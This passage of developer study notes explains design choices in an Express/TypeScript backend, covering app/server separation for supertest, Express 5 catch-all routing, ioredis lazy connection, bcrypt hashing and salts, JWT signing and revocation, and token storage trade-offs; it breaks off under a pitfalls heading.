### The app.ts / server.ts split, and testing an Express app with supertest

**What it is.** Splitting "build the Express app and register its
middleware" (`src/app.ts`, exports `app`, never calls `.listen()`) from
"start listening on a port, handle graceful shutdown"
(`src/server.ts`, imports `app`, is the only place that calls
`app.listen()`).

**Why it exists in this project.** Before this phase, `server.ts` built
`app` and called `.listen()` in the same file, with `app` never
exported. That made the app fundamentally untestable at the HTTP level:
importing that file to test a route would also open a real port and
initialize the real DB pool as unavoidable side effects. Splitting the
two means a test can import `src/app.ts` alone and get a fully
configured Express app with none of those side effects.

**How it works mechanically.** `src/app.ts` builds `app = express()`,
registers every middleware and route in order, and exports `app` — that's
the entire file's job, nothing calls `.listen()`. `src/server.ts` imports
that `app`, calls `app.listen(config.PORT, ...)`, and owns the existing
graceful-shutdown logic (SIGTERM/SIGINT → `server.close()` →
`Promise.all([pool.end(), redis.quit()])` → exit), unchanged in
structure from Phase 1 aside from also closing the new Redis client
alongside the existing Postgres pool. In every test file under
`tests/middleware/` and `tests/routes/`, `supertest(app)` (or an
ad-hoc `express()` app built inline, for tests that want to isolate one
middleware) wraps the exported Express app and issues real HTTP-shaped
requests against it internally per call, without either binding a real,
fixed TCP port or requiring any test-specific coordination between test
files that both want port 3000.

**Where it lives in the codebase.** `src/app.ts` (composition root);
`src/server.ts` (listen + shutdown only); every file under
`tests/middleware/` and `tests/routes/` uses `supertest`.

**Common pitfalls.**

- Calling `app.listen()` inside `app.ts` "for convenience" — reintroduces
  exactly the untestable coupling this split exists to remove; any test
  importing `app.ts` would open a real port as a side effect again.
- Importing `src/app.ts` in a test file that needs a specific
  `NODE_ENV`/config value (like `tests/routes/health.test.ts` needing
  `.env.test`'s values) via a plain top-level `import` — `src/config/
index.ts` reads `process.env` at module-evaluation time, and ES module
  imports are always fully evaluated before any of the importing file's
  own top-level statements run, regardless of where the import appears
  textually in the file. A `process.loadEnvFile('.env.test')` call
  written above a static `import { app } from '../../src/app.js'` still
  loses the race — the fix is a **dynamic** `import()` inside
  `beforeAll`, deferring evaluation until after the env is loaded (see
  `tests/routes/health.test.ts`).
- Forgetting that `tests/globalSetup.ts` runs once, before test files
  are loaded, in a way that doesn't reliably propagate its own
  `process.loadEnvFile` call into each test file's process/worker — this
  codebase's existing convention (`tests/db/constraints.test.ts`,
  followed here in `tests/routes/health.test.ts`) is for every test file
  that needs `.env.test`'s values to call `process.loadEnvFile('.env.test')`
  itself, redundantly, rather than relying on global setup alone.

**Production considerations.** This split has no runtime behavior
difference in production — `npm start` still runs `server.ts`, which
still calls `app.listen()` exactly once. The entire benefit is
testability; there's no tradeoff to weigh against it.

**Interview answer.** I split the Express app's construction from
starting the server: `app.ts` builds and exports the configured `app`
without ever calling `.listen()`, and `server.ts` is the only file that
imports `app` and starts listening, alongside the existing graceful-
shutdown logic. That split is what makes the app testable at the HTTP
level with `supertest` — tests import `app.ts` directly and get a fully
wired Express app with no real port opened and no server lifecycle to
manage, since supertest handles request/response internally against the
app object rather than needing a real, bound socket.

---

### The path-to-regexp v8 wildcard change, and the catch-all 404 pattern

**What it is.** Express 5 bundles `path-to-regexp@8`, which dropped
support for a bare `'*'` as a route pattern — the classic Express-4
catch-all idiom, `app.use('*', notFoundHandler)`, now throws at
route-registration time instead of matching every path.

**Why it exists in this project.** A catch-all 404 handler is required
scope for this phase (registered after every real route, before the
error handler), and the obvious, most-documented way to write one — the
Express-4-era `app.use('*', ...)` — actively breaks the app on this
Express version. This was verified directly against the installed
version rather than assumed from older tutorials or training data.

**How it works mechanically.** Confirmed by running it:
`app.use('*', (req, res) => res.end())` throws `Missing parameter name
at index 1: *` immediately, at the `app.use()` call itself, because
`path-to-regexp@8` (Express 5's bundled router-pattern parser) no longer
treats a bare `*` as "match anything" — the syntax it does support for
wildcards changed. The fix used in `src/middleware/notFoundHandler.ts`
is to register it with **no path argument at all**:
`app.use(notFoundHandler)`. A path-less `app.use()` was never tied to
`path-to-regexp`'s pattern syntax in the first place — it matches every
method and path unconditionally, with no route-pattern parsing
involved, which is both the fix for this specific version and a more
version-agnostic way to express "match everything" than depending on
whatever wildcard syntax path-to-regexp happens to support at any given
Express major version.

**Where it lives in the codebase.**
`src/middleware/notFoundHandler.ts` (the handler itself);
`app.use(notFoundHandler)` in `src/app.ts`, registered after every route
and before the error handler.

**Common pitfalls.**

- Copying `app.use('*', ...)` from older Express-4 documentation,
  tutorials, or Stack Overflow answers without testing against the
  actual installed Express version — throws immediately at startup on
  Express 5 with `path-to-regexp@8`, not a subtle runtime bug but a hard
  crash the moment that line registers.
- Assuming `app.get('/*', ...)` (rather than `app.use`) is a safe
  alternative — it has the same underlying `path-to-regexp` wildcard-
  syntax dependency and the same failure mode; the actual fix is
  avoiding a path argument entirely for a true catch-all, not finding a
  different wildcard string that happens to still parse.
- Not verifying a "well-known" library behavior against the actual
  installed version when it materially changes a design — this specific
  fact was confirmed by literally running `app.use('*', fn)` against the
  installed `node_modules/express`, rather than trusted from general
  Express knowledge, precisely because Express 5's dependency bump was
  exactly the kind of change generic knowledge can be stale about.

**Production considerations.** None beyond the registration-time crash
itself — since it throws immediately at app construction, this fails
loudly and immediately in any environment (dev, CI, or prod) the moment
the offending line is registered, rather than manifesting as a subtle
runtime bug. That's the best-case version of "this is broken" — it's
impossible to miss.

**Interview answer.** Express 5 bundles a newer major version of
`path-to-regexp`, its internal route-pattern parser, which dropped
support for a bare `'*'` wildcard — the classic Express-4 catch-all
pattern `app.use('*', handler)` now throws at registration time instead
of matching every route. I write the catch-all with no path argument at
all — `app.use(handler)` — which was never tied to path-to-regexp's
pattern syntax in the first place and matches everything unconditionally,
which is both the fix for this Express version and more resilient to
whatever wildcard syntax future versions support or drop.

---

### ioredis: lazy vs eager connection, and mirroring pg.Pool's laziness

**What it is.** Whether a database/cache client opens its network
connection the moment it's constructed (eager) or defers it until the
first real command is issued (lazy) — a configuration choice, not a
fixed property of the library.

**Why it exists in this project.** `src/lib/redis.ts` is imported
transitively by `src/app.ts` (via the health route), and `src/app.ts` is
imported by every test file in `tests/middleware/` and `tests/routes/`
— including ones that have nothing to do with Redis at all. If
constructing the Redis client opened a real connection immediately, just
importing `app.ts` for an unrelated middleware test would trigger a real
network connection as an invisible side effect.

**How it works mechanically.** `ioredis` connects eagerly **by
default** — the moment `new Redis(url)` runs, it opens a real TCP
socket. That's different from `pg.Pool` (`src/db/pool.ts`), which is
lazy by default: constructing a `Pool` allocates no connections until
the first `.query()` call. `src/lib/redis.ts` passes
`lazyConnect: true` explicitly to make `ioredis` behave the same way
`pg.Pool` already does — the connection only opens on the first actual
command, which in practice is `checkRedisHealth`'s `PING`. Without that
flag, the two dependency clients in this codebase would have
inconsistent behavior for no functional reason, and every module that
happens to import `redis.ts` — directly or transitively — would carry
an invisible eager-connection side effect the equivalent Postgres import
doesn't have.

Separately, `maxRetriesPerRequest: 1` bounds how many times one
in-flight command (the health-check ping) is retried while the
connection is down before its promise rejects — this is what makes
`checkRedisHealth()` fail fast instead of riding out `ioredis`'s
default, considerably longer retry budget. This is a genuinely different
knob from `retryStrategy` (left at its default), which governs
background _reconnection_ attempts after a connection drops — that's
allowed to keep retrying indefinitely in the background, since it
doesn't block anything; `maxRetriesPerRequest` is specifically about how
long one caller waits for one command's result.

**Where it lives in the codebase.** `src/lib/redis.ts` — the `redis`
client and `checkRedisHealth()`; `src/db/pool.ts` for the analogous
(already-lazy-by-default) Postgres pattern this mirrors.

**Common pitfalls.**

- Constructing `new Redis(url)` without `lazyConnect: true` in a module
  that might be imported for reasons unrelated to Redis (as `app.ts` is,
  by many test files) — turns "import this file" into "open a real
  network connection," which is surprising, slows down unrelated tests,
  and can make a test suite depend on Redis being reachable even for
  tests that never touch it.
- Confusing `retryStrategy` and `maxRetriesPerRequest` — tuning the
  wrong one when trying to make a health check fail faster (adjusting
  `retryStrategy`, which governs reconnection, does nothing to bound how
  long an individual command waits).
- Assuming `lazyConnect` means "never connects automatically" — it only
  defers the _first_ connection to the first command; once that command
  runs, the client behaves exactly like an eagerly-connected one for
  every subsequent command, including staying connected in the
  background.

**Production considerations.** BullMQ — this repository's future
`worker/` process — requires `ioredis` specifically as its Redis client
(not the other major Node Redis library, `node-redis`), which is why
`ioredis` was chosen here for connection-only health checking rather
than a different, perhaps simpler, client: it's the one client this
codebase will need again regardless, so introducing it now means the
worker phase reuses this exact _library_ rather than adding a second
Redis client to the dependency tree later. (Phase 9, once it arrives,
turns out to _not_ reuse this exact client _instance_ for BullMQ —
`maxRetriesPerRequest: 1` here is incompatible with BullMQ's `Worker`,
which requires `maxRetriesPerRequest: null`. See Notes.md, "Phase 9:
Background Jobs" for the dedicated-connection reasoning; the shared
library choice made here still stands.)

**Interview answer.** `ioredis` connects eagerly by default — opening a
real socket the moment the client is constructed — which is the
opposite of `pg.Pool`'s default laziness in this same codebase. Since
the Redis client module gets imported transitively by many things that
have nothing to do with Redis (any test that imports the app), I pass
`lazyConnect: true` so constructing the client is side-effect-free and
the actual connection only opens on the first real command, matching how
the Postgres pool already behaves. Separately, I bound
`maxRetriesPerRequest` to `1` so a health-check ping fails fast instead
of riding out the client's default retry budget when Redis is down —
distinct from `retryStrategy`, which governs unrelated background
reconnection and is left at its default.

## Phase 4: Authentication

### New dependencies: bcryptjs and jsonwebtoken

**What it is.** Two runtime dependencies added in this phase: `bcryptjs`
(password hashing) and `jsonwebtoken` (signing/verifying JWTs), plus
`@types/jsonwebtoken` as a dev dependency since `jsonwebtoken` ships no
bundled types (`bcryptjs` does, so no separate types package was needed
for it).

**Why it exists in this project.** Neither password hashing nor JWT
handling has a reasonable hand-rolled implementation — both are exactly
the kind of security-critical, easy-to-get-subtly-wrong code where using
a widely-audited library is the responsible choice, not a shortcut.

**How it works mechanically / the alternatives.**

- `bcryptjs` was chosen over `bcrypt` (the more common choice, native
  bindings via `node-gyp`). `bcrypt` is faster since it runs compiled C++
  rather than pure JS, but that speed comes with a native compile step
  that can fail across platforms, Docker base images, or CI runners
  without the right build toolchain present. `bcryptjs` is a drop-in-
  compatible pure-JS reimplementation of the same algorithm — same hash
  format, same API shape (`hash`/`compare`/`hashSync`/`compareSync`) —
  trading some raw speed for zero native-build risk. For this project's
  scale, that's the right trade: nothing here is hashing at a volume
  where the speed difference matters, but a broken Docker build over a
  native dependency is a real, recurring annoyance.
- `jsonwebtoken` was chosen over `jose` (a more modern, ESM-native
  library with broader algorithm and JWK support). `jose` is the better
  choice for anything doing asymmetric signing, key rotation via JWKS, or
  needing non-Node runtimes (edge functions, browsers). This project only
  needs the simplest case — sign and verify with one shared secret,
  HS256 — which is exactly `jsonwebtoken`'s core use case and where its
  simpler, more widely-known API is a better fit than `jose`'s larger
  surface area.

**Where it lives in the codebase.** `src/services/passwordService.ts`
(`bcryptjs`), `src/services/tokenService.ts` (`jsonwebtoken`).

**Common pitfalls.**

- Reaching for `bcrypt` by default out of familiarity without weighing
  the native-build risk against the actual performance need.
- Assuming `jsonwebtoken`'s types match runtime behavior exactly —
  `@types/jsonwebtoken`'s `expiresIn` type is a template-literal union
  narrower than plain `string`, which doesn't accept a Zod-validated
  config string without a cast (see the JWT structure section below).

**Production considerations.** If this project ever needed asymmetric
signing (e.g. a separate service verifying tokens without holding the
signing secret) or JWK-based key rotation, `jose` would become the
better choice and this would be worth revisiting — the two libraries
aren't a "correct vs incorrect" choice, just scoped to different needs.

**Interview answer.** I chose `bcryptjs` over `bcrypt` to avoid a native
compile step that can break across platforms and CI, accepting a modest
speed cost for a project that isn't hashing at meaningful volume. I chose
`jsonwebtoken` over `jose` because this project only needs simple
shared-secret HS256 sign/verify, where `jsonwebtoken`'s smaller, more
familiar API is a better fit than `jose`'s broader but heavier surface
aimed at asymmetric keys and JWK rotation.

---

### Hashing vs. encryption for passwords

**What it is.** Encryption is reversible: given the right key, ciphertext
converts back to the original plaintext. Hashing is (by design)
one-way: a hash function maps input to a fixed-size output with no
inverse operation — there's no key that turns a bcrypt hash back into
the original password.

**Why it exists in this project.** `users.password_hash` stores a hash,
never an encrypted password, because the application itself never needs
to recover a user's original password — only to check whether a
candidate string matches. If passwords were merely encrypted, anyone who
obtained both the ciphertext and the encryption key (a database breach
plus, say, an app-config leak) could recover every plaintext password
directly. Hashing removes that risk structurally: there is no key to
steal that would undo it.

**How it works mechanically.** `passwordService.hashPassword` calls
`bcrypt.hash(plain, cost)`, which never stores `plain` anywhere — only
the one-way hash. Verifying a login re-hashes the candidate password
(using the salt embedded in the stored hash, see the Salt section below)
and compares the two hash outputs, never decrypting anything.

**Where it lives in the codebase.** `src/services/passwordService.ts`;
the `password_hash` column in `migrations/20260810111606772_create-users-table.ts`.

**Common pitfalls.**

- Calling a hashed password "encrypted" in code comments or docs — the
  distinction matters because it implies a recovery path that doesn't
  exist and shouldn't be designed for.
- Building a "forgot password" flow that tries to recover and email the
  original password — structurally impossible with hashing, and a
  correct password-reset flow (invalidate + let the user set a new one)
  doesn't need it anyway.

**Production considerations.** None beyond what's already true here —
this is a settled, non-controversial practice; the interesting decisions
are downstream of it (which hash function, what cost factor — see next).

**Interview answer.** Encryption is reversible with the right key;
hashing isn't reversible at all. Passwords are hashed, not encrypted,
because the app never needs the original password back — only to check
whether a login attempt matches — and removing the possibility of
recovery means a database breach alone (without some separate encryption
key) can't hand an attacker plaintext passwords.

---

### Why bcrypt over SHA-256: the attacker-economics argument

**What it is.** SHA-256 is a general-purpose cryptographic hash function,
designed to be as fast as possible. bcrypt is a password-hashing
function specifically, designed to be deliberately, tunably slow.

**Why it exists in this project.** Fast isn't a virtue for a password
hash — it's the opposite. `passwordService.ts` uses bcrypt (via
`bcryptjs`), not `crypto.createHash('sha256')`, specifically because
SHA-256's speed is a liability against offline brute-force.

**How it works mechanically.** If an attacker steals a database of
password hashes, they no longer need the live application at all — they
can brute-force guesses locally, as fast as their hardware allows, with
no rate limiting or network latency in the way. Modern GPUs compute
billions of SHA-256 hashes per second, so a stolen SHA-256 hash of even
a fairly strong password can often be brute-forced in a practical amount
of time. bcrypt is deliberately expensive per hash — driven by its cost
factor (next section) — so the same GPU that computes billions of
SHA-256 hashes per second might compute only a few hundred or thousand
bcrypt hashes per second at a reasonable cost. That difference compounds
across an entire stolen database: cracking is an economics problem
(attacker time and hardware cost per guess), and bcrypt raises the cost
per guess by many orders of magnitude compared to a general-purpose hash.

**Where it lives in the codebase.** `src/services/passwordService.ts`.

**Common pitfalls.**

- Using any general-purpose hash (SHA-256, SHA-512, MD5) for passwords —
  they're built to be fast, which is exactly wrong here.
- Assuming "cryptographically secure hash" alone is sufficient — SHA-256
  is cryptographically secure (collision-resistant, etc.) but that's a
  different property from being slow enough to resist brute-forcing.

**Production considerations.** bcrypt has a 72-byte input limit (longer
passwords are silently truncated by some implementations) and no
built-in memory-hardness, which is why newer algorithms like Argon2 are
sometimes preferred for new systems. bcrypt remains a reasonable,
well-audited, widely-supported choice and is what this project uses; a
future migration to Argon2 would be a reasonable evolution, not a
correction of a mistake.

**Interview answer.** A general-purpose hash like SHA-256 is designed to
be fast, which is exactly the wrong property for password storage: if a
database of hashes is ever stolen, an attacker brute-forces offline with
no rate limiting, and a fast hash lets them try billions of guesses per
second. bcrypt is deliberately slow and tunably so via its cost factor,
which raises the cost of each guess by orders of magnitude and makes
brute-forcing a stolen hash database economically impractical rather
than just theoretically hard.

---

### The bcrypt cost factor: what it trades off, and why it's a DoS surface

**What it is.** bcrypt's cost factor (also called "work factor" or
"rounds") controls how many times its internal key-derivation step
repeats. It's not linear — each increment of the cost factor roughly
**doubles** the time a single hash or comparison takes.

**Why it exists in this project.** `BCRYPT_COST` (`src/config/env.ts`,
default `12`) is a configuration value, not a hardcoded constant,
specifically so it can be tuned per environment without a code change:
production uses `12` (a reasonable 2024+ default, ~200-300ms per hash on
typical hardware), while `.env.test` overrides it to `4` so the test
suite — which hashes and compares passwords repeatedly across signup,
login, and the dummy-hash timing mitigation — stays fast.

**How it works mechanically.** Every signup calls `hashPassword`
(~200-300ms at cost 12); every login calls `verifyPassword` against a
real hash, or — on a failed lookup — `verifyAgainstDummyHash`, which
still costs the same ~200-300ms (see the Timing Attacks section below
for why that's deliberate). That means **every** `POST /api/auth/login`
request, successful or not, does a fixed, non-trivial amount of CPU
work. A specific number of concurrent requests to `/login` can
meaningfully load the server's CPU in a way most other endpoints in this
codebase can't — this makes the login endpoint a plausible
denial-of-service surface distinct from a general traffic flood, and is
part of why the cost factor is a genuine security/operability trade,
not just a "bigger number is more secure" knob.

**Where it lives in the codebase.** `BCRYPT_COST` in
`src/config/env.ts`; consumed in `src/services/passwordService.ts`.

**Common pitfalls.**

- Treating cost as a linear scale — going from 10 to 12 isn't "20% more
  work," it's roughly 4x the work, because each increment doubles the
  previous one.
- Setting production cost too high without load-testing the login
  endpoint under concurrency, and being surprised when a moderate spike
  in login attempts (legitimate or a credential-stuffing attempt) causes
  real CPU pressure.
- Forgetting to raise the cost over time — hardware gets faster every
  year, so a cost that was expensive-enough in 2020 is measurably
  cheaper to brute-force today at the same setting.

**Production considerations.** Cost should be re-evaluated periodically
against current hardware (this is an industry-standard practice, not
specific to this project) and against real login-endpoint latency
budgets/load. A production system under real credential-stuffing attack
traffic would likely need rate limiting on `/login` in front of this
cost, not instead of it — see the OWASP-style rate-limiting middleware
this codebase doesn't have yet (see CLAUDE.md's architecture note on
`src/middleware/` for rate limiting as a future responsibility).

**Interview answer.** bcrypt's cost factor is exponential, not linear —
each increment roughly doubles hashing time — which is what makes it
tunable against ever-faster brute-forcing hardware over time. But that
same cost is paid on every legitimate hash or comparison too, including
every login attempt, which turns the login endpoint into a real CPU-load
surface: a burst of login requests, even without any brute-forcing
intent, does meaningfully more server-side work than most other
endpoints. Choosing a cost factor is a genuine trade between
brute-force resistance and legitimate-traffic capacity, not a
"maximize it" decision.

---

### Salt: what it defeats, where bcrypt stores it, and why compare() works anyway

**What it is.** A salt is random data mixed into a password before
hashing, unique per hash. It's not secret — it's stored alongside (in
bcrypt's case, embedded within) the hash itself.

**Why it exists in this project.** Without a salt, two users with the
same password would produce the identical hash, and an attacker could
precompute a lookup table of hash → common-password pairs once (a
"rainbow table") and check every stolen hash against it instantly,
regardless of bcrypt's per-hash cost. A salt defeats precomputation:
since every hash is salted differently, there's no single table that
covers even two users with the same password, let alone an entire
database — the attacker is forced back to brute-forcing each hash
individually, which is exactly what the cost factor is designed to make
expensive.

**How it works mechanically.** `bcrypt.hash(plain, cost)` generates a
fresh random salt internally on every call and encodes it directly into
the returned string, in a fixed format:
`$2b$<cost>$<22-char-salt><31-char-hash>` — one string, no separate salt
column needed anywhere in the schema (confirmed by the test in
`tests/services/passwordService.test.ts` asserting two hashes of the
identical password differ). `bcrypt.compare(plain, storedHash)` works
despite that randomness because it doesn't need the salt supplied
separately — it parses the salt back out of `storedHash`'s own prefix,
re-hashes the candidate `plain` password using that exact salt and cost,
and compares the two resulting hash strings for equality. The salt was
never secret; its only job is uniqueness, not confidentiality.

**Where it lives in the codebase.**
`src/services/passwordService.ts` — `hashPassword`/`verifyPassword`; no
separate salt column exists in `users` (see
`migrations/20260810111606772_create-users-table.ts`) because it isn't
needed.

**Common pitfalls.**

- Trying to add a separate `salt` column "to be safe" — bcrypt hashes
  already carry their own salt; a second one is redundant and easy to
  wire up inconsistently with the embedded one.
- Confusing "salt" with "secret" — a salt is stored in the clear
  alongside the hash and provides no protection if reused predictably;
  its value is exclusively in being unique per hash, not in being
  hidden.

**Production considerations.** None beyond what's already correct here
— bcrypt's salt handling is a solved, standard part of the algorithm;
nothing about it needs custom implementation or configuration in this
codebase.

**Interview answer.** A salt is random per-hash data that defeats
precomputed rainbow-table attacks by ensuring no two hashes of the same
password ever match, forcing an attacker to brute-force each one
individually. bcrypt generates a fresh salt on every hash call and
embeds it directly in the returned hash string, so there's no separate
salt column to manage — `compare()` works despite the randomness because
it re-extracts the salt from the stored hash's own prefix before
re-hashing the candidate password with it.

---

### JWT structure: three parts, base64 not encryption, and what's safe to include

**What it is.** A JSON Web Token is three base64url-encoded segments
joined by dots: `header.payload.signature` — e.g.
`eyJhbGc...​.eyJzdWI...​.SflKxwRJ...`. The header names the signing
algorithm; the payload carries claims (in this project, just `sub`,
`iat`, `exp`); the signature is a cryptographic MAC over the first two
segments.

**Why it exists in this project.** `src/services/tokenService.ts` issues
one of these per successful signup/login as the client's proof of
identity for subsequent requests, without the server needing to store
any session state (see the Stateless Auth section below).

**How it works mechanically.** Base64url is an _encoding_, not
_encryption_ — reversible by anyone, with no key required. Pasting any
JWT into a decoder (e.g. jwt.io) reveals its full header and payload
instantly. This project's payload is deliberately minimal — `signToken`
passes `{}` as the payload object and lets `jwt.sign`'s `subject` option
populate `sub` — because anything placed in a JWT payload should be
treated as world-readable: never a password, never anything sensitive,
only an opaque identifier plus timing claims (`iat`, `exp`). Only the
signature segment resists forgery (see the next section) — the payload
itself has zero confidentiality.

**Where it lives in the codebase.** `src/services/tokenService.ts` —
`signToken`; `TokenPayload` documents the exact claim shape this project
uses.

**Common pitfalls.**

- Assuming a JWT's contents are hidden because they look like an opaque
  token — they're one base64 decode away from being fully readable
  plaintext.
- Stuffing a JWT payload with sensitive or frequently-changing data
  (roles, email, feature flags) — anything in the payload is both
  publicly readable and frozen at issue time (stale until the token
  expires and is reissued), neither of which is true of a live database
  row.

**Production considerations.** If this project later needs to carry more
claims (e.g. a role for authorization), the same "public, frozen at
issue time" caveat applies to whatever gets added — a decision to make
deliberately, not by default.

**Interview answer.** A JWT is three base64url segments —
header, payload, signature — and base64 is just an encoding, not
encryption, so the payload is fully readable by anyone who has the
token, with no secret required to decode it. This project's payload only
ever carries a user id (`sub`) plus standard timing claims, on the
principle that nothing placed in a JWT payload should be treated as
confidential.

---

### Signature verification mechanics: how tampering is detected

**What it is.** The mechanism that makes a JWT's _signature_ — as
opposed to its payload — resistant to forgery: an HMAC-SHA256
computation over the header and payload, using a secret only the server
knows.

**Why it exists in this project.** Without this, a client could hand-edit
a token's base64-decoded payload (e.g. change `sub` to someone else's
user id) and hand it right back — the payload alone has no built-in
integrity check.

**How it works mechanically.** `jwt.sign` computes
`HMAC-SHA256(header + "." + payload, JWT_SECRET)` and appends the result
as the third segment. `jwt.verify` (in
`src/services/tokenService.ts`'s `verifyToken`) recomputes that exact
same HMAC over the token's own header and payload segments, using the
server's `JWT_SECRET`, and compares it to the signature segment the
token actually carries. Because HMAC-SHA256 is a cryptographic hash
function, changing even a single bit anywhere in the header or payload
produces a completely different HMAC output — there's no way to predict
what edit would produce a signature that still matches, short of
knowing the secret and recomputing it correctly. This is exactly what
`tests/services/tokenService.test.ts`'s tampered-payload test exercises:
editing the decoded payload and reassembling the token with the
_original_ signature produces a signature mismatch, and `verifyToken`
returns `{ ok: false, reason: 'invalid' }`.

**Where it lives in the codebase.** `src/services/tokenService.ts` —
`verifyToken`; `JWT_SECRET` in `src/config/env.ts` (required, minimum 32
characters, no default — see below for what a weak/leaked secret allows).

**Common pitfalls.**

- Assuming `jwt.verify` inspects the payload's _content_ for anything
  suspicious — it doesn't; it only checks whether the signature matches
  what the header+payload should produce given the secret. A tampered
  payload with a _coincidentally_ still-valid-looking shape is rejected
  purely because its signature no longer matches, not because the
  content itself was scrutinized.
- Not specifying/restricting the signing algorithm — `jsonwebtoken`
  defaults `jwt.sign` to HS256 here, which is what `verifyToken` expects;
  a known JWT vulnerability class involves an attacker resubmitting a
  token with `alg: none` or switching HS256/RS256 in ways a lax verifier
  accepts. This project's usage is the simple, single-secret, single-
  algorithm case, which sidesteps that class of bug rather than needing
  to defend against it explicitly.

**Production considerations.** A leaked `JWT_SECRET` breaks this
guarantee entirely — see the next section for exactly what that allows
an attacker to do, and why the env var has no default.

**Interview answer.** `jwt.verify` recomputes the HMAC-SHA256 signature
over the token's header and payload using the server's secret, and
compares it against the signature segment the token carries — it never
inspects payload content directly. Because a cryptographic hash changes
completely from even a single-bit input change, any edit to the payload
after signing produces a signature that no longer matches, which is how
tampering is detected — not by validating the payload's shape, but by
the recomputed signature simply not matching anymore.

---

### Stateless auth: the revocation problem, and the three standard mitigations

**What it is.** "Stateless" here means the server verifies a token's
validity purely by recomputing its signature — no database lookup, no
server-side session store consulted on every request. The tradeoff: once
issued, a token is valid until it expires, and the server has no
built-in way to invalidate it early.

**Why it exists in this project.** `requireAuth`
(`src/middleware/auth.ts`) is deliberately a pure function of the
token — no DB query on the happy path — which is what makes every
authenticated request cheap. That statelessness is also exactly what
creates the revocation gap this section is about.

**How it works mechanically — the revocation problem.** If a user's
account is compromised, their password is changed, or they explicitly
log out, any JWT already issued to them remains fully valid — signature
still matches, `exp` hasn't passed — until it naturally expires. There's
no "delete this session" operation possible against a stateless token by
design, because there's no server-side session record to delete.

**The three standard mitigations (industry-standard patterns — none
implemented in this project yet, deliberately, as this phase's scope is
just signup/login/verify):**

1. **Short expiry.** Bound the damage window by keeping token lifetime
   short. This project uses `JWT_EXPIRES_IN=7d`, a usability-leaning
   choice appropriate for a low-stakes personal-project auth flow — a
   production system handling anything sensitive would likely use
   something much shorter (minutes to hours), paired with mitigation 3.
2. **A denylist (blocklist).** Store revoked-but-not-yet-expired token
   identifiers (or user-ids-as-of-a-timestamp) somewhere fast to check —
   typically Redis, which this project already has wired up for a future
   phase — and check it on each request. This reintroduces a lookup, but
   a cheap one (a Redis existence check), not a full session store.
3. **Refresh-token rotation.** Issue a short-lived access token (minutes)
   alongside a longer-lived, revocable refresh token, stored server-side.
   The access token stays fast and stateless for normal requests; the
   refresh token is the one place revocation actually happens, and it's
   checked far less often (only when the access token expires).

**Where it lives in the codebase.** `src/middleware/auth.ts` (stateless
verification); `JWT_EXPIRES_IN` in `src/config/env.ts`. None of the
three mitigations are implemented — this is a documented gap, not an
oversight.

**Common pitfalls.**

- Believing a JWT can be "logged out" server-side with no additional
  infrastructure — without one of the three mitigations above, deleting
  a token client-side (e.g. clearing localStorage) prevents that _one_
  client from using it again, but the token itself is still cryptograph-
  ically valid if captured or replayed elsewhere.
- Choosing an very long expiry "for convenience" without weighing that
  it directly sets the ceiling on how long a compromised token stays
  dangerous.

**Production considerations.** A real production system handling
sensitive data would very likely need at minimum a short access-token
expiry plus refresh-token rotation (mitigations 1 + 3) — this project's
7-day, no-revocation setup is an explicit, documented simplification for
its current phase, flagged here specifically so it isn't mistaken for a
production-ready default later.

**Interview answer.** Stateless JWT auth means the server verifies
tokens purely by signature, with no session lookup — which is fast, but
means there's no way to revoke a token early once issued; it stays valid
until it expires no matter what happens to the account afterward. The
three standard mitigations are keeping expiry short to bound the damage
window, maintaining a denylist of revoked tokens checked against a fast
store like Redis, or splitting into a short-lived stateless access token
plus a longer-lived, revocable refresh token. This project currently
uses a 7-day token with none of those mitigations, which is a
deliberate, documented simplification for its current scope rather than
a production-ready choice.

---

### Bearer token transport: the Authorization header convention

**What it is.** The `Authorization: Bearer <token>` HTTP header is the
standard convention (RFC 6750) for a client to present a token proving
its identity on each request — "bearer" meaning whoever holds
(bears) the token is treated as authorized, no further proof needed.

**Why it exists in this project.** `requireAuth` reads exactly this
header and requires the exact `"Bearer "` prefix — matching how every
HTTP client, browser devtools, and API testing tool (curl, Postman,
etc.) already expects to send a token, rather than inventing a
project-specific header or convention.

**How it works mechanically.** `req.header('authorization')` reads the
raw header value; `requireAuth` checks it starts with the literal
7-character string `"Bearer "` (case-sensitive, matching the RFC's
convention), then treats everything after that prefix as the token
itself, which gets handed to `verifyToken`.

**Where it lives in the codebase.** `src/middleware/auth.ts`.

**Common pitfalls.**

- Forgetting the header check is case-sensitive on the scheme name — a
  client sending `bearer <token>` (lowercase) fails the `startsWith`
  check and gets a 401, correctly per the header convention but
  potentially surprising if a client library doesn't follow it exactly.
- Logging the raw `Authorization` header for debugging — this is exactly
  what `requireAuth`'s failure-path logging deliberately avoids: the
  token itself is never included in any `req.log` call, only the fact
  that a request failed and why (missing/invalid/expired).

**Production considerations.** None beyond what's already correct —
this is a settled HTTP convention, not a project-specific design
decision.

**Interview answer.** `Authorization: Bearer <token>` is the standard
RFC 6750 convention for presenting a token — "bearer" means the holder
of the token is trusted without further proof, which is exactly the
model a stateless JWT fits. The middleware requires the exact `"Bearer "`
prefix and treats everything after it as the token to verify, matching
what every standard HTTP client already expects to send.

---

### localStorage vs. httpOnly cookies: the XSS/CSRF tradeoff

**What it is.** Two places a client could store the JWT this API issues:
JavaScript-accessible browser storage (`localStorage`), or an `httpOnly`
cookie the browser attaches automatically and JavaScript can't read.

**Why it exists in this project (as a deliberate decision, not an
oversight).** This API returns the token directly in the JSON response
body (`{ user, token }`) rather than setting a cookie itself — that
choice implicitly hands storage responsibility to whatever frontend
consumes this API (the separate Next.js frontend mentioned in
CLAUDE.md), and is worth documenting explicitly rather than leaving
implicit.

**How it works mechanically — the tradeoff.**

- **`localStorage`** — Any JavaScript running on the page can read it,
  including injected JavaScript from a successful XSS attack. If an
  attacker gets any script to execute on the frontend (e.g. via an
  unescaped user-generated field rendered somewhere), they can read the
  token directly and exfiltrate it. It's immune to CSRF, though — a
  malicious third-party site can't read another origin's `localStorage`,
  and requests still require the frontend's own JS to explicitly attach
  the token to each request.
- **`httpOnly` cookie** — JavaScript literally cannot read it (the
  `httpOnly` flag exists for exactly this), so a successful XSS attack
  can't exfiltrate the token directly (though it can often still make
  authenticated requests _through_ the victim's browser while the page
  is open, which is a narrower blast radius than stealing the token
  outright). But cookies are attached to requests automatically by the
  browser, for _any_ site, which is what opens up CSRF — a malicious
  site can trigger a request to this API and the browser will attach the
  cookie, unless CSRF protection (e.g. a `SameSite` cookie attribute
  plus a CSRF token) is separately implemented.

**Where it lives in the codebase.** `src/routes/auth.ts` — the token is
returned in the JSON body on both signup and login, not set as a cookie
by this API.

**Common pitfalls.**

